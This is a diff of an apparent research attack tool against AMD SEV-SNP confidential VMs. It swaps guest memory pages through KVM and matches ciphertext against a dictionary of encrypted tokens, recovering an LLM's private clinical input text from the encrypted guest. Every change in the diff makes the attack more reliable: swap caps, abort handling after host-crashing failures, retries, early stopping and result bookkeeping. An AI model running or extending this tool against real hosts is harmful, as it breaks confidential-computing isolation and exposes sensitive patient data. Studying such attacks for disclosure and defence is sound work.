@@ -176,6 +176,15 @@ _LABEL_ORDER: list[int] = sorted(
     ),
 )
 
+# image_pad x4 reference label — used ONLY by _find_pad_start / _find_pad_end /
+# _estimate_pad_bounds (via _IPAD4_IDX) to locate the padding run, NOT a
+# clinical label. Appended AFTER _LABEL_ORDER so sweep_blind never tries to
+# match it inside indication text, while build_dict (which iterates
+# TOKEN_LABELS directly) still captures it into the dictionary.
+# Restores the _IPAD4_IDX definition dropped by the personal-info scrub commit.
+TOKEN_LABELS.append((' <image_pad x4>', [IMAGE_PAD_TOKEN_ID] * 4))
+_IPAD4_IDX = len(TOKEN_LABELS) - 1
+
 DRAIN_EVERY = 1   # drain guest RX before every ICMP send — large payloads +
                   # mdelay(HOLD) pile up and eventually stop frag logging
 _GUEST_RECOVERY_TIMEOUT = 300
@@ -207,6 +216,13 @@ _SWAP_PACE_SEC  = 0.25   # min interval between consecutive snp_guest_page_move
                          # 0.25s → max ~48 cmds/s (safe margin below ~60 limit)
 _SWAP_BURST_COOLDOWN = 10   # after this many swaps, insert extra cooldown
 _SWAP_BURST_SLEEP    = 2.0  # seconds to sleep on burst cooldown
+
+# Hard per-call ceiling on snp_guest_page_move rounds inside sweep_blind(),
+# independent of per-swap pacing. A validated fully-blind sweep with the
+# early-stop patch used ~33 swaps (2026-09-04, index 2); this leaves >2x
+# margin while still bounding worst case. See the MAX_SWAPS_PER_SWEEP check
+# at the swap_key cache-miss site below for why this exists.
+MAX_SWAPS_PER_SWEEP = 100
 
 
 # Fallback only when guest does not report HEADER_CONST_HINT / tok_start
@@ -716,30 +732,136 @@ def _bytes_to_xp_dump(gpa: int, raw: bytes) -> str:
     return "\n".join(lines)
 
 
-def _swap_read_raw(swap_tool: str, dict_gpa: int, ind_page_gpa: int) -> bytes | None:
-    """ONE --swap-back round-trip + ONE KVM_READ_PAGE_DUMP. Returns None on failure.
+# Stats from the most recent sweep_blind() call. Exposed as module state
+# rather than a third return value so external callers that unpack
+# (matches, N_est) keep working. run_all reads skip_unproven to decide between
+# NO_MATCH and INCONCLUSIVE.
+LAST_SWEEP_STATS: dict = {"skip_safe": 0, "skip_unproven": 0, "swaps": 0}
+
+
+class SwapAbort(RuntimeError):
+    """A swap failed in a way that leaves guest memory or the RMP unsound.
+
+    Raised for the mid-sequence failures of the 6x snp_guest_page_move
+    round-trip. The kernel's swap path (svm.c _swap_guest_pages_loop_body)
+    has NO unwind: if `gfn1 -> tmp` succeeds and `gfn2 -> gfn1` then fails, it
+    just `goto page_swap_complete` and returns, leaving the guest half-swapped
+    and pages stuck immutable. snp_guest_page_move's own error path documents
+    why it cannot clean up either -- SEV_CMD_SNP_PAGE_RECLAIM on a
+    pre-guest/pre-swap immutable page can trigger a PSP platform reset -- so it
+    deliberately leaks the pages instead. Leaked immutable pages that the host
+    later recycles fault as RMP violations in kernel context, which is the
+    mechanism behind the observed host reboots. Continuing to swap after such a
+    failure compounds the leak, so this must unwind all the way out of run_all.
+    """
+
+
+# dmesg is the only channel that distinguishes failure kinds: swap_pages_tool
+# collapses ioctl error, done != 1 and timeout into a single `return 1`.
+_DMESG_ABORT = (
+    "failed to move page",                 # any of the 3 moves, mid-sequence
+    "KVM_PAGE_SWAP: failed to move page",
+    "Failed to set RMP state",
+    "sev_do_cmd failed",
+    "snp_reclaim_pages failed",
+)
+# Rejected BEFORE the first snp_guest_page_move -> guest memory untouched.
+# is_pfn_sev_private() only compares the RMP entry's ASID to the guest's, and a
+# page holding input_ids is by definition guest-private, so this rejection
+# PROVES the page is not the target. Safe to skip.
+_DMESG_SKIP_SAFE = ("is not private",)
+# Also pre-move, but host-side (scratch pfn / swap-gfn assignment). Says
+# nothing about the guest page's content, so skipping could silently drop the
+# GT page. Must be retried, never skipped.
+_DMESG_RETRY = (
+    "invalid target_pfn",
+    "Failed to assign swap GFNs",
+    "invalid snp_context_pfn",
+    "invalid slot for gfn",
+)
+
+_dmesg_seen_ts: float = 0.0
+_RE_DMESG_TS = re.compile(r'^\[\s*(\d+\.\d+)\]')
+
+
+def _classify_swap_failure(tool_stderr: str = "") -> str:
+    """Return 'abort' | 'skip_safe' | 'retry' | 'unknown' for the last failure.
+
+    Only called after a failure, so the dmesg cost is paid once per failure,
+    not once per swap. Messages are filtered by kernel timestamp against the
+    high-water mark from the previous call so a stale error cannot be
+    misattributed to this swap.
+    """
+    global _dmesg_seen_ts
+    if "Timed out" in tool_stderr:
+        # The swap neither completed nor reported an error: state unknown, and
+        # an in-flight move may still land. Treat as unsound.
+        return "abort"
+    try:
+        out = subprocess.run(["dmesg", "-k"], capture_output=True, text=True,
+                             timeout=10).stdout
+    except Exception as e:
+        log_err(f"  [blind] could not read dmesg to classify failure: {e}")
+        return "unknown"
+
+    fresh, hi = [], _dmesg_seen_ts
+    for line in out.splitlines():
+        m = _RE_DMESG_TS.match(line)
+        if not m:
+            continue
+        ts = float(m.group(1))
+        hi = max(hi, ts)
+        if ts > _dmesg_seen_ts:
+            fresh.append(line)
+    _dmesg_seen_ts = hi
+
+    blob = "\n".join(fresh)
+    for pat in _DMESG_ABORT:
+        if pat in blob:
+            log_err(f"  [blind] dmesg says UNSOUND ({pat!r}) — aborting")
+            for ln in fresh[-6:]:
+                log_err(f"  [blind]   {ln}")
+            return "abort"
+    if any(p in blob for p in _DMESG_SKIP_SAFE):
+        return "skip_safe"
+    if any(p in blob for p in _DMESG_RETRY):
+        return "retry"
+    return "unknown"
+
+
+_SWAP_ROUNDTRIP_RETRIES = 2   # full re-swaps for a host-side (content-agnostic)
+                              # failure; bounded so a wedged host cannot spin
+
+
+def _swap_read_raw(swap_tool: str, dict_gpa: int,
+                   ind_page_gpa: int) -> tuple[bytes | None, str]:
+    """ONE --swap-back round-trip + ONE KVM_READ_PAGE_DUMP.
+
+    Returns (raw, reason):
+      (bytes, "ok")          success
+      (None,  "skip_safe")   the page is provably NOT the target (the kernel
+                             rejected it as not guest-private, and input_ids
+                             always lives in guest-private memory), or it is
+                             the dict page itself. Dropping it loses nothing.
+      (None,  "unknown")     failed for a reason that says nothing about the
+                             page's content, after exhausting retries. The
+                             caller MUST NOT treat a sweep containing these as
+                             a clean miss -- the skipped page could have been
+                             the target.
+    Raises SwapAbort when dmesg shows the guest/RMP was left unsound.
 
     Kernel semantics (is_swap_back=true): forward-swap so gfn1 holds gfn2's
     plaintext retweaked under gfn1's GPA, snapshot that into page_dump_buf,
     then swap back (guest RAM restored). KVM_READ_PAGE_DUMP returns that
     snapshot and CLEARS page_dump_valid — a second dump ioctl is always
-    -EAGAIN. Do not "confirm" with a second read or a second tool invoke
-    unless you intentionally want another full round-trip.
+    -EAGAIN, so recovering a lost dump needs a whole new round-trip.
 
     Callers pass dict_gpa as gfn1 (tweak target) and the page to sample as
     gfn2. Match: (dict_gpa from cache, ind_page).
     """
     if (dict_gpa & ~0xFFF) == (ind_page_gpa & ~0xFFF):
         log_err(f"  [blind] refuse self-swap gpa=0x{dict_gpa & ~0xFFF:x}")
-        return None
-
-    r = subprocess.run(
-        [swap_tool, f"0x{dict_gpa:x}", f"0x{ind_page_gpa:x}", "--swap-back"],
-        capture_output=True)
-    if r.returncode != 0:
-        log_err(f"  [blind] swap failed dict_gpa=0x{dict_gpa:x} "
-                f"ind_page=0x{ind_page_gpa:x} (rc={r.returncode})")
-        return None
+        return None, "skip_safe"
 
     def _read_dump() -> bytes:
         kvm_fd = os.open("/dev/kvm", os.O_RDWR | os.O_CLOEXEC)
@@ -750,20 +872,46 @@ def _swap_read_raw(swap_tool: str, dict_gpa: int, ind_page_gpa: int) -> bytes | 
         finally:
             os.close(kvm_fd)
 
-    for attempt in range(2):
-        try:
-            return _read_dump()
-        except OSError as e:
-            # EAGAIN: page_dump_valid was false — no fresh post-swap snapshot
-            # yet. Retry the READ only; the swap already happened once.
-            if e.errno == errno.EAGAIN and attempt == 0:
-                log_err(f"  [blind] KVM_READ_PAGE_DUMP EAGAIN "
-                        f"dict_gpa=0x{dict_gpa:x} — retrying read once (no re-swap)")
+    for attempt in range(_SWAP_ROUNDTRIP_RETRIES):
+        r = subprocess.run(
+            [swap_tool, f"0x{dict_gpa:x}", f"0x{ind_page_gpa:x}", "--swap-back"],
+            capture_output=True)
+        if r.returncode != 0:
+            stderr = (r.stderr or b"").decode(errors="replace")
+            kind = _classify_swap_failure(stderr)
+            log_err(f"  [blind] swap failed dict_gpa=0x{dict_gpa:x} "
+                    f"ind_page=0x{ind_page_gpa:x} (rc={r.returncode}, {kind})")
+            if kind == "abort":
+                raise SwapAbort(
+                    f"unsound swap dict_gpa=0x{dict_gpa:x} "
+                    f"ind_page=0x{ind_page_gpa:x}")
+            if kind == "skip_safe":
+                return None, "skip_safe"
+            # "retry" and "unknown" are both content-agnostic: retry the whole
+            # round-trip rather than skip, so the target page is never dropped
+            # for a reason unrelated to what it holds.
+            if attempt + 1 < _SWAP_ROUNDTRIP_RETRIES:
+                time.sleep(_SWAP_PACE_SEC)
                 continue
-            log_err(f"  [blind] KVM_READ_PAGE_DUMP failed dict_gpa=0x{dict_gpa:x} "
-                    f"ind_page=0x{ind_page_gpa:x}: {e}")
-            return None
-    return None
+            return None, "unknown"
+
+        try:
+            return _read_dump(), "ok"
+        except OSError as e:
+            if e.errno == errno.EAGAIN:
+                # page_dump_valid was false. The dump is consume-once, so the
+                # only way back is another full round-trip, not another ioctl.
+                log_err(f"  [blind] KVM_READ_PAGE_DUMP EAGAIN "
+                        f"dict_gpa=0x{dict_gpa:x} — re-running the round-trip")
+                if attempt + 1 < _SWAP_ROUNDTRIP_RETRIES:
+                    time.sleep(_SWAP_PACE_SEC)
+                    continue
+            else:
+                log_err(f"  [blind] KVM_READ_PAGE_DUMP failed "
+                        f"dict_gpa=0x{dict_gpa:x} "
+                        f"ind_page=0x{ind_page_gpa:x}: {e}")
+            return None, "unknown"
+    return None, "unknown"
 
 
 def do_swap_read(swap_tool: str, dict_gpa: int, src_gpa: int, out_path: Path) -> None:
@@ -1096,14 +1244,21 @@ def _check_tok_is_image_pad(base_gpa: int, tok_start: int,
         return None
     dict_gpa = int(entry["gpa"], 16)
     cp_path  = Path(entry["cp_file"])
-    raw = _swap_read_raw(swap_tool, dict_gpa, ind_page_gpa)
+    raw, _reason = _swap_read_raw(swap_tool, dict_gpa, ind_page_gpa)
     if raw is None:
         return None
     cp_data = _parse_cp_file(cp_path)
     if cp_data is None:
         return None
-    if raw == cp_data:
-        return None
+    # raw == cp_data used to return None here as a "self-swap" guard. That
+    # discarded the strongest possible positive: image_pad x4 is four copies of
+    # the SAME token id, so its dict page is a period-8 constant pattern, and a
+    # guest page sitting fully inside the padding run holds identical plaintext
+    # -- hence identical ciphertext under gfn1's tweak. A full-page match is
+    # exactly what a pure-padding page looks like, i.e. the thing this function
+    # exists to find. Self-swap is already refused by the gfn1 == gfn2 check in
+    # _swap_read_raw(), so no content-based guard is needed; _verify_raw_inline
+    # returns True on a full-page match, which is the correct answer.
     return _verify_raw_inline(raw, cp_data, token_offset,
                               len(TOKEN_LABELS[_IPAD4_IDX][1]) * 8)
 
@@ -1249,6 +1404,19 @@ def sweep_blind(base_gpa: int, cache: dict, swap_tool: str,
     _BSEARCH_MARGIN = 1
     N_est: int | None = None
     hc = header_const if header_const is not None else HEADER_CONST
+    # True only for the fully-blind call (no guest N/N_ind/tok_start at all —
+    # the only caller is host-only recovery, e.g. llm_e2e2.py). That path's
+    # Phase-2 window is a worst-case guess (POST_SCAN_MIN..POST_SCAN_MAX =
+    # 20..60 tokens past the estimated pad end), much wider than a real
+    # indication (usually a handful of tokens). Scanning the full window
+    # walks tens of tokens past the true indication end into whatever
+    # follows it (template/pad/reused buffer content), where several labels'
+    # single clean AES blocks (MIN_CLEAN_AES_BLOCKS=1) alias unrelated
+    # ciphertext and MULTI_MATCH-bloat the result — confirmed live 2026-09-04
+    # (index 2: clean hits at tok 448/452, then 5 repeating spurious labels
+    # at tok 460..476). Exact-window callers (run_all, using guest-reported
+    # N_ind) are unaffected — they already scan only the true indication span.
+    fully_blind = N is None
 
     if N is not None and exact:
         if tok_start_exact is not None:
@@ -1284,11 +1452,17 @@ def sweep_blind(base_gpa: int, cache: dict, swap_tool: str,
             log_err("[blind] pad-bounds estimation inconclusive")
             return [], None
 
-    _swap_cache: dict[tuple[int, int], bytes | None] = {}
+    _swap_cache: dict[tuple[int, int], tuple[bytes | None, str]] = {}
     _cp_cache:   dict[str, bytes | None]             = {}
-    _n_swap_fail = _n_swap_self = _n_no_blocks = _n_weak = _n_mismatch = 0
+    _n_swap_fail = _n_fullpage = _n_no_blocks = _n_weak = _n_mismatch = 0
     _n_overflow = 0
     _n_swaps_this_sweep = 0
+    # Pages dropped for a reason that does NOT prove they were not the target.
+    # If this is non-zero and nothing matched, the sweep is INCONCLUSIVE, not a
+    # clean miss: the skipped page could have held input_ids. Recording that as
+    # NO_MATCH would mark the sample done and lose it permanently.
+    _n_skip_unproven = 0
+    _n_skip_safe = 0
 
     # Exclusive end of the indication token window — labels that stick past
     # this (e.g. 6tok into a 5tok indication) are rejected as overflow.
@@ -1298,7 +1472,28 @@ def sweep_blind(base_gpa: int, cache: dict, swap_tool: str,
     # run_all records all matches.
     scored: list[tuple] = []  # (score, tok_start, ind_gpa, token_idx, raw, dict_gpa, n_blocks, label)
 
+    # Fully-blind early stop: once we're past the first confirmed hit, give up
+    # after BLIND_STOP_GAP consecutive tok_start values with no NEW hit. A
+    # real indication is contiguous text — genuine label hits cluster right
+    # after it starts; a gap that size is not "still inside the indication",
+    # it's the guess-window's worst-case tail.
+    # Calibrated live 2026-09-04 (index 2): true hits at tok=448 and tok=452
+    # (gap=4, "Shortness OF BREATH and FEVER" — one unmatched word "and" in
+    # between); the false-positive tail started at tok=460 (gap=8 from the
+    # last true hit). GAP=6 stops at tok=459 — clears the true gap (4) with
+    # margin, and breaks strictly before the tail is ever reached (8 > 6).
+    # Before any hit, last_hit_tok is None and this never fires, so a late-
+    # starting real indication is never cut off early — only the trailing
+    # scan PAST a found indication is shortened.
+    BLIND_STOP_GAP = 6
+    last_hit_tok: int | None = None
+
     for tok_start in range(tok_p2_min, tok_p2_max + 1):
+        if fully_blind and last_hit_tok is not None \
+                and tok_start - last_hit_tok > BLIND_STOP_GAP:
+            log(f"  [blind] early stop at tok={tok_start} "
+                f"({BLIND_STOP_GAP} tok gap since last hit at {last_hit_tok})")
+            break
         ind_gpa      = base_gpa + tok_start * 8
         token_offset = ind_gpa & 0xFFF
         ind_page_gpa = ind_gpa & ~0xFFF
@@ -1321,6 +1516,30 @@ def sweep_blind(base_gpa: int, cache: dict, swap_tool: str,
 
             swap_key = (dict_gpa, ind_page_gpa)
             if swap_key not in _swap_cache:
+                # Hard ceiling — independent of the caller's own pacing.
+                # Reported host reboot (2026-09-04) traced to an UNBOUNDED
+                # swap cascade in a caller (llm_batch_pilot.py) that chained
+                # several full-block scans with no cap on total swaps for one
+                # sweep_blind() call. Per-swap pacing alone was not a
+                # sufficient safety net at that scale — this stops the
+                # function itself from ever emitting more than
+                # MAX_SWAPS_PER_SWEEP snp_guest_page_move rounds, regardless
+                # of what any caller does.
+                if _n_swaps_this_sweep >= MAX_SWAPS_PER_SWEEP:
+                    log_err(f"  [!] sweep_blind: hit MAX_SWAPS_PER_SWEEP="
+                            f"{MAX_SWAPS_PER_SWEEP} — aborting sweep early "
+                            f"(tok_start={tok_start})")
+                    LAST_SWEEP_STATS.update(
+                        skip_safe=_n_skip_safe,
+                        # hitting the cap leaves the rest of the block
+                        # untested, which is exactly an unproven skip
+                        skip_unproven=_n_skip_unproven + 1,
+                        swaps=_n_swaps_this_sweep)
+                    return ([{
+                        "tok_start": m[1], "ind_gpa": m[2], "token_idx": m[3],
+                        "n_blocks": m[6], "label": m[7],
+                    } for m in sorted(scored, key=lambda c: c[0], reverse=True)]
+                            if scored else []), N_est
                 _n_swaps_this_sweep += 1
                 if _SWAP_BURST_COOLDOWN > 0 and _n_swaps_this_sweep % _SWAP_BURST_COOLDOWN == 0:
                     log(f"  [pace] burst cooldown after {_n_swaps_this_sweep} swaps "
@@ -1328,10 +1547,18 @@ def sweep_blind(base_gpa: int, cache: dict, swap_tool: str,
                     time.sleep(_SWAP_BURST_SLEEP)
                 elif _SWAP_PACE_SEC > 0:
                     time.sleep(_SWAP_PACE_SEC)
-                _swap_cache[swap_key] = _swap_read_raw(swap_tool, dict_gpa, ind_page_gpa)
-            raw = _swap_cache[swap_key]
+                # SwapAbort propagates out of sweep_blind and out of run_all:
+                # after an unsound swap the guest is half-modified and every
+                # further swap compounds the RMP leak.
+                _swap_cache[swap_key] = _swap_read_raw(
+                    swap_tool, dict_gpa, ind_page_gpa)
+            raw, reason = _swap_cache[swap_key]
             if raw is None:
                 _n_swap_fail += 1
+                if reason == "skip_safe":
+                    _n_skip_safe += 1
+                else:
+                    _n_skip_unproven += 1
                 continue
 
             cp_key = str(cp_path)
@@ -1341,10 +1568,15 @@ def sweep_blind(base_gpa: int, cache: dict, swap_tool: str,
             if cp_data is None:
                 continue
 
+            # A full-page match is NOT a self-swap and must not be discarded:
+            # _swap_read_raw() already refuses gfn1 == gfn2, and for the
+            # image_pad x4 entry (all four tokens are the same id, so the dict
+            # page is a period-8 constant pattern) a guest page lying entirely
+            # inside the padding run legitimately produces byte-identical
+            # ciphertext. Dropping it here threw away the clearest hit. Count
+            # it for visibility and fall through to the normal verification.
             if raw == cp_data:
-                _n_swap_self += 1
-                _swap_cache[swap_key] = None
-                continue
+                _n_fullpage += 1
 
             token_len = n_tok * 8
             blocks = _clean_aes_blocks_inline(token_offset, token_len)
@@ -1367,6 +1599,8 @@ def sweep_blind(base_gpa: int, cache: dict, swap_tool: str,
             score = (-dist, len(blocks), token_len)
             scored.append((score, tok_start, ind_gpa, token_idx, raw, dict_gpa,
                            len(blocks), label))
+            if fully_blind:
+                last_hit_tok = tok_start if last_hit_tok is None else max(last_hit_tok, tok_start)
 
     if scored:
         scored.sort(key=lambda c: c[0], reverse=True)
@@ -1389,17 +1623,31 @@ def sweep_blind(base_gpa: int, cache: dict, swap_tool: str,
                 f"tok={m['tok_start']} idx={m['token_idx']} '{m['label']}' "
                 f"off=0x{m['ind_gpa'] & 0xFFF:x} blocks={m['n_blocks']}"
                 for m in matches))
+        LAST_SWEEP_STATS.update(skip_safe=_n_skip_safe,
+                                skip_unproven=_n_skip_unproven,
+                                swaps=_n_swaps_this_sweep)
         return matches, N_est
 
-    log_err(f"[blind] No match: swap_fail={_n_swap_fail} swap_self={_n_swap_self}"
+    log_err(f"[blind] No match: swap_fail={_n_swap_fail}"
+            f" skip_safe={_n_skip_safe} skip_unproven={_n_skip_unproven}"
+            f" fullpage_match={_n_fullpage}"
             f" no_blocks={_n_no_blocks} weak_blocks={_n_weak} mismatch={_n_mismatch}"
             f" overflow={_n_overflow}")
+    LAST_SWEEP_STATS.update(skip_safe=_n_skip_safe,
+                            skip_unproven=_n_skip_unproven,
+                            swaps=_n_swaps_this_sweep)
     return [], N_est
 
 
 # ---------------------------------------------------------------------------
 # run_all
 # ---------------------------------------------------------------------------
+
+def _skipcols(stats: dict) -> dict:
+    return {"skip_safe": stats.get("skip_safe", 0),
+            "skip_unproven": stats.get("skip_unproven", 0),
+            "swaps": stats.get("swaps", 0)}
+
 
 def run_all(swap_tool: str, blind: bool = False) -> None:
     """Load filtered_samples.json and run blind sweep for each sample."""
@@ -1423,13 +1671,24 @@ def run_all(swap_tool: str, blind: bool = False) -> None:
 
     _CSV_FIELDS = ["timestamp", "index", "indication", "verdict",
                    "n_matches", "token_idx", "label", "tok_start",
-                   "indication_gpa", "n_blocks", "N_est"]
+                   "indication_gpa", "n_blocks", "N_est",
+                   "skip_safe", "skip_unproven", "swaps"]
 
+    # Only these verdicts mean "this sample is settled". INCONCLUSIVE and
+    # ABORT must stay retryable: an INCONCLUSIVE sweep skipped at least one
+    # page for a reason that does not prove the page was not the target, and an
+    # ABORT never finished at all. Treating either as done would silently drop
+    # the sample forever -- the failure mode this bookkeeping exists to stop.
+    _TERMINAL = ("MATCH", "MULTI_MATCH", "NO_MATCH")
     done_indices: set[int] = set()
     if results_csv.exists():
         with open(results_csv, newline="") as f:
-            done_indices = {int(r["index"]) for r in csv.DictReader(f)}
-        log(f"[run-all] Resuming: {len(done_indices)} already done")
+            rows = list(csv.DictReader(f))
+        done_indices = {int(r["index"]) for r in rows
+                        if r.get("verdict") in _TERMINAL}
+        retry = {int(r["index"]) for r in rows} - done_indices
+        log(f"[run-all] Resuming: {len(done_indices)} settled, "
+            f"{len(retry)} to retry")
 
     need_header = not results_csv.exists() or results_csv.stat().st_size == 0
     csv_fh  = open(results_csv, "a", newline="")
@@ -1461,6 +1720,7 @@ def run_all(swap_tool: str, blind: bool = False) -> None:
                        "token_idx": "", "label": "", "tok_start": "",
                        "indication_gpa": "", "n_blocks": "", "N_est": ""}
             else:
+                aborted = None
                 try:
                     if blind:
                         matches, N_est = sweep_blind(base_gpa, cache, swap_tool)
@@ -1469,9 +1729,30 @@ def run_all(swap_tool: str, blind: bool = False) -> None:
                             base_gpa, cache, swap_tool,
                             N=N_actual, exact=True, N_ind=N_ind_actual,
                             tok_start_exact=tok_start_g, header_const=header_c)
+                except SwapAbort as e:
+                    # Guest memory is half-swapped and pages are stuck
+                    # immutable. Nothing further can be trusted, and every
+                    # extra swap grows the leak that eventually faults the
+                    # host. Record the sample as retryable and stop the run.
+                    aborted = str(e)
+                    matches, N_est = [], None
                 finally:
                     # Drop input_ids only after sweep/swap-back finishes.
                     session.release()
+                stats = dict(LAST_SWEEP_STATS)
+                if aborted:
+                    row = {"index": index, "indication": indication,
+                           "verdict": "ABORT", "n_matches": 0,
+                           "token_idx": "", "label": "", "tok_start": "",
+                           "indication_gpa": "", "n_blocks": "", "N_est": "",
+                           **_skipcols(stats)}
+                    row["timestamp"] = datetime.datetime.now().strftime(
+                        "%Y-%m-%dT%H:%M:%S")
+                    writer.writerow(row); csv_fh.flush()
+                    log_err(f"[run-all] index={index} ABORT: {aborted}")
+                    log_err("[run-all] The guest is no longer sound. Restart it "
+                            "before resuming; this sample stays retryable.")
+                    break
                 if matches:
                     verdict = "MATCH" if len(matches) == 1 else "MULTI_MATCH"
                     row = {
@@ -1492,12 +1773,26 @@ def run_all(swap_tool: str, blind: bool = False) -> None:
                            "token_idx": "", "label": "", "tok_start": "",
                            "indication_gpa": "", "n_blocks": "", "N_est": ""}
                 else:
+                    # A miss only counts as NO_MATCH if every page was actually
+                    # tested. Any unproven skip means the target may simply
+                    # never have been looked at.
+                    unproven = stats.get("skip_unproven", 0)
                     row = {"index": index, "indication": indication,
-                           "verdict": "NO_MATCH", "n_matches": 0,
+                           "verdict": "INCONCLUSIVE" if unproven else "NO_MATCH",
+                           "n_matches": 0,
                            "token_idx": "", "label": "", "tok_start": "",
                            "indication_gpa": "", "n_blocks": "",
                            "N_est": N_est}
+                    if unproven:
+                        log_err(f"[run-all] index={index} INCONCLUSIVE: "
+                                f"{unproven} page(s) skipped for reasons that do "
+                                f"not rule them out — will be retried")
 
+            row.setdefault("skip_safe", "")
+            row.setdefault("skip_unproven", "")
+            row.setdefault("swaps", "")
+            if base_gpa is not None:
+                row.update(_skipcols(stats))
             row["timestamp"] = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
             writer.writerow(row)
             csv_fh.flush()
